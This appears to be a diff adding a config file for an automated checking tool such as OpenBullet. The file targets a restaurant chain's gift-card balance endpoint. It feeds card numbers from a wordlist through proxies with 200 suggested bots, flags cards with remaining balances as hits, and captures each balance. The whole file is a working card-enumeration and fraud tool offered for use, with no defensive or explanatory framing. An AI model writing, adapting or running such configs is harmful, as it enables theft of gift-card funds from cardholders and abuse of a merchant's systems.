@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Pramanti Bros",
+  "SuggestedBots": 200,
+  "LastModified": "2018-05-19T12:11:48.1400698+00:00",
+  "AdditionalInfo": "Can highly addjust success and ban keys. ",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login_Stage REQUEST GET "https://primantibros.alohaenterprise.com:4430/servlet/MemberLinkSVServlet?companyID=pbi01&requestType=checkSVCardForEPin&cardNumber=<USER>&_=1526690789732" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host:: primantibros.alohaenterprise.com:4430" 
+  HEADER "Referer:: https://primantibros.alohaenterprise.com:4430/memberlink/GiftCards.html?companyID=pbi01&_ga=2.9867388.851093206.1503069062-168826335.1503069062" 
+#Succes_&_Fail KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"cardBalance\":0,\"cardNumber\":\"\",\"expirationDate\":null,\"svHistory\":[]}" 
+    KEY "{\"cardBalance\":0,\"" 
+  KEYCHAIN Success OR 
+    KEY "currentCardBalance\":100,\"" 
+    KEY "currentCardBalance\":95,\"" 
+    KEY "currentCardBalance\":90,\"" 
+    KEY "currentCardBalance\":85,\"" 
+    KEY "currentCardBalance\":80,\"" 
+    KEY "currentCardBalance\":75,\"" 
+    KEY "currentCardBalance\":70,\"" 
+    KEY "currentCardBalance\":65,\"" 
+    KEY "currentCardBalance\":60,\"" 
+    KEY "currentCardBalance\":55,\"" 
+    KEY "currentCardBalance\":50,\"" 
+    KEY "currentCardBalance\":45,\"" 
+    KEY "currentCardBalance\":40,\"" 
+    KEY "currentCardBalance\":35,\"" 
+    KEY "currentCardBalance\":33,\"" 
+    KEY "currentCardBalance\":30,\"" 
+    KEY "currentCardBalance\":25,\"" 
+#Capture PARSE "<SOURCE>" LR ",\"currentCardBalance\":" ",\"dateOfBusiness\":{\"" Recursive=FALSE -> CAP "Balance" "" "" 
